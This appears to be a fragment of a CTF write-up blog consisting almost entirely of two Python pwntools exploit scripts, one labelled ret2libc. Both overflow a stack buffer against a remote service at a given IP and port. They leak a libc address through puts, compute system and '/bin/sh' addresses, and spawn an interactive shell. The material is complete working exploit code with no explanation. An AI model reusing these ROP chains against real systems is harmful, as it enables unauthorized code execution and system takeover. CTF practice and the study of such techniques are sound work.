<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>elf=ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>p = remote(<span class="hljs-string">&#x27;58.240.236.231&#x27;</span>,<span class="hljs-number">49003</span>)<br>pop_rdi_ret = <span class="hljs-number">0x40072b</span><br>ret_addr = <span class="hljs-number">0x400509</span><br>main_addr = <span class="hljs-number">0x4006c7</span><br>syscall = <span class="hljs-number">0x400741</span><br>puts_plt = <span class="hljs-number">0x400520</span><br>puts_got = <span class="hljs-number">0x601018</span><br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">64</span>+<span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">8</span>+p64(pop_rdi_ret)+p64(puts_got)+p64(puts_plt)+p64(main_addr)<br>p.sendline(payload)<br><br>puts_addr = u64(p.recvuntil(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\00&#x27;</span>))<br>log.info(<span class="hljs-string">&quot;puts addr is :%x&quot;</span>%puts_addr)<br>libc = LibcSearcher(<span class="hljs-string">&#x27;puts&#x27;</span>,puts_addr)<br>libc_base = puts_addr - libc.dump(<span class="hljs-string">&#x27;puts&#x27;</span>)<br>system_addr = libc_base + libc.dump(<span class="hljs-string">&#x27;system&#x27;</span>)<br>bin_addr = libc_base + libc.dump(<span class="hljs-string">&#x27;str_bin_sh&#x27;</span>)<br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">64</span>+<span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">8</span> + p64(ret_addr)+ p64(pop_rdi_ret) + p64(<span class="hljs-number">0x601048</span>) + p64(system_addr)<br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure>

<p><em><strong>ret2libc</strong></em></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br><span class="hljs-keyword">import</span> sgtlibc<br>elf=ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>p = remote(<span class="hljs-string">&#x27;58.240.236.231&#x27;</span>,<span class="hljs-number">49002</span>)<br>libc =ELF(<span class="hljs-string">&#x27;libc-2.23.so&#x27;</span>)<br>pop_rdi_ret = <span class="hljs-number">0x400783</span><br>ret_addr = <span class="hljs-number">0x400509</span><br>main_addr = <span class="hljs-number">0x4006FD</span><br>puts_plt = <span class="hljs-number">0x400520</span><br>puts_got = <span class="hljs-number">0x601018</span><br>bss = <span class="hljs-number">0x601060</span><br>payload1 = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">208</span>+<span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">8</span>+p64(pop_rdi_ret)+p64(puts_got)+p64(puts_plt)+p64(main_addr)<br>p.sendline(payload1)<br><br>puts_addr = u64(p.recvuntil(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\00&#x27;</span>))<br>s = sgtlibc.Searcher()<br>s.add_condition(<span class="hljs-string">&#x27;puts&#x27;</span>,puts_addr)<br>s.dump(db_index=<span class="hljs-number">3</span>) <span class="hljs-comment"># search libc , if returns multi-result ,default use index-0&#x27;s result</span><br><br>system_addr = s.get_address(sgtlibc.s_system)<br>binsh_addr = s.get_address(sgtlibc.s_binsh)<br>puts_addr_ = s.get_address(sgtlibc.s_puts)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(system_addr), <span class="hljs-built_in">hex</span>(binsh_addr), <span class="hljs-built_in">hex</span>(puts_addr_))<br>libc_base = puts_addr - puts_addr_<br>system = libc_base + system_addr<br>bin_sh = libc_base + binsh_addr<br><br>payload2 = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">208</span>+<span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">8</span> + p64(ret_addr) + p64(pop_rdi_ret) + p64(bin_sh) + p64(system)+ p64(ret_addr)<br><br>p.sendlineafter(<span class="hljs-string">&quot;name:&quot;</span>,payload2)<br>p.interactive()<br><br><span class="hljs-comment">#LibcSearcher 扫出来的死都不对，气煞我也！</span><br></code></pre></td></tr></table></figure>
